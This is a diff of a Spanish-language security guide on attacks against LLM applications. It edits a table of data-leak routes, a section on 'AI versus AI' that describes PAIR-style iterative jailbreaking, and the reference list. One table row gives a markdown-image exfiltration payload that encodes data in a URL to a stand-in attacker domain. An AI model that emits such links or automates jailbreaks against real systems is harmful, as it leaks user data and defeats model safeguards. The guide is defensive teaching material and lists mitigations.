@@ -151,7 +151,7 @@ Fuga	Mecanismo	Ejemplo	Mitigación
 Prompt de sistema	El modelo revela sus instrucciones	Claves o reglas internas expuestas	No poner secretos en el prompt
 Documentos corporativos	Recuperación sin control de acceso (RAG)	Un usuario obtiene el fichero de otro departamento	Control de acceso aplicado antes de la recuperación
 Aislamiento entre usuarios	Memoria o caché compartida	Respuestas con datos de otra sesión	Aislar sesión, memoria y caché por usuario
-Exfiltración por salida	Enlace o imagen que codifica datos en la URL	`![x](https://atacante.tld/?d=DATOS)`	Bloquear dominios externos en el render
+Exfiltración por salida	Enlace o imagen que codifica datos en la URL	`!\[x](https://atacante.tld/?d=DATOS)`	Bloquear dominios externos en el render
 Datos de entrenamiento	Memorización de información sensible	Texto personal reproducido literalmente	Depuración de datos, evaluación de memorización
 
 Medida	Descripción
@@ -228,7 +228,7 @@ Registro y auditoría	Trazabilidad de cada acción, con su origen y su contexto
 Control de la memoria	Revisar qué se guarda y poder borrarlo
 
 7. IA contra IA
-La automatización del ataque: un modelo genera, prueba y adapta ataques contra otro. Un modelo puede generar variantes de entrada para evaluar otro modelo. PAIR estudia un procedimiento de refinamiento iterativo en el que un modelo atacante utiliza respuestas del modelo objetivo para modificar sus propuestas [R9]. Sus resultados corresponden a los modelos y condiciones del estudio, no a una tasa universal de éxito.
+La automatización del ataque: un modelo genera, prueba y adapta ataques contra otro. Un modelo puede generar variantes de entrada para evaluar otro modelo. PAIR estudia un procedimiento de refinamiento iterativo en el que un modelo atacante utiliza respuestas del modelo objetivo para modificar sus propuestas [[R9]](https://arxiv.org/abs/2310.08419). Sus resultados corresponden a los modelos y condiciones del estudio, no a una tasa universal de éxito.
 ```
  ┌───────────────┐   ataque    ┌───────────────┐
  │ IA atacante   │────────────►│ IA objetivo   │
@@ -266,23 +266,5 @@ NIS2	Obligaciones de ciberseguridad en entidades esenciales e importantes
 CFAA (EE. UU.)	Acceso no autorizado a sistemas informáticos
 El autor no se hace responsable del uso indebido. Prueba solo en sistemas propios o con autorización escrita.
 ---
-Referencias:
-Fuentes primarias. Se enlazan expresamente las fichas OWASP 2025 utilizadas como referencia; la numeración no se presenta como una edición 2026. Los casos y prompts del laboratorio son ejemplos originales de este material, no reproducciones de incidentes ni validaciones de productos concretos.
-[R1] OWASP: LLM01:2025 Prompt Injection.
-[R2] OWASP: LLM02:2025 Sensitive Information Disclosure.
-[R3] OWASP: LLM03:2025 Supply Chain.
-[R4] OWASP: LLM04:2025 Data and Model Poisoning.
-[R5] OWASP: LLM10:2025 Unbounded Consumption.
-[R6] OWASP: LLM06:2025 Excessive Agency.
-[R7] Greshake et al.: Not what you've signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection, 2023.
-[R8] Tramèr et al.: Stealing Machine Learning Models via Prediction APIs, 2016.
-[R9] Chao et al.: Jailbreaking Black Box Large Language Models in Twenty Queries, 2023; revisión de 2024.
-[R10] MITRE: ATLAS, catálogo de tácticas, técnicas y casos de amenazas contra sistemas de IA.
-[R11] Carlini et al.: Extracting Training Data from Large Language Models, 2020.
-[R12] Zou et al.: Universal and Transferable Adversarial Attacks on Aligned Language Models, 2023.
-[R13] OWASP: LLM07:2025 System Prompt Leakage.
-[R14] Carlini et al.: Poisoning Web-Scale Training Datasets is Practical, 2023.
-[R15] Zou et al.: PoisonedRAG: Knowledge Corruption Attacks to Retrieval-Augmented Generation of Large Language Models, 2024.
-[R16] Mehrotra et al.: Tree of Attacks: Jailbreaking Black-Box LLMs Automatically, 2023.
 ---
 www.hackingyseguridad.com
